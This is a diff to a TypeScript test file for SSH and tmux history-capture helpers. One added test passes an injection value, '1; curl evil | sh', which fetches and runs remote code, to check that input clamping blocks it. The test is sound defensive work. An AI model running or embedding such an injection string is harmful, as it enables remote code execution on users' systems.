@@ -17,6 +17,7 @@ import {
   remoteEndpointFileContents,
   scpArgs
 } from './control-master'
+import { clampHistoryLines } from '../pty-manager'
 
 const conn = { host: 'h.example.com', user: 'deploy', port: 2222, identityFile: '/k/id' }
 
@@ -189,6 +190,12 @@ describe('remoteCaptureHistoryArgs', () => {
   it('captures history ABOVE the visible screen (-E -1) so the attach redraw is not duplicated', () => {
     const args = remoteCaptureHistoryArgs(conn, '/tmp/cm', 'nt-x', 5000)
     const cmd = args[args.length - 1]
+    expect(cmd).toContain('capture-pane -p -e -t nt-x -S -5000 -E -1')
+  })
+  it('a hostile `lines` value clamped by the caller cannot inject shell (defence in depth)', () => {
+    const n = clampHistoryLines('1; curl evil | sh' as unknown as number)
+    const cmd = remoteCaptureHistoryArgs(conn, '/tmp/cm', 'nt-x', n).slice(-1)[0]
+    expect(cmd).not.toContain('curl')
     expect(cmd).toContain('capture-pane -p -e -t nt-x -S -5000 -E -1')
   })
 })
